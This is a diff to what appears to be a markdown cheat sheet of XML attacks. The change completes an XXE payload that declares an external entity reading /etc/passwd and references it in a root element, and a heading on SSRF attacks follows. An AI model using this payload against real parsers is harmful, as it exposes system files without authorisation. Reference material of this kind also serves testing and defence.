@@ -2,7 +2,8 @@
 
 ## using external entities
 ```xml
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<root>&xxe;</root>
 ```
 
 ## perform SSRF attacks
